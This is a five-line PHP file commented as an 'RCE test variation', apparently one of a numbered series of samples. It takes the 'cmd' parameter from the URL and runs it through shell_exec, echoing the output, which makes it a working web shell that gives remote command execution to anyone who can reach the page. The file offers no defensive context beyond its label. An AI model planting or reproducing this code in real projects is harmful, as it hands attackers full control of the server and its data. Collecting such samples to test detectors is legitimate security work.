<?php
// RCE test variation #846
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>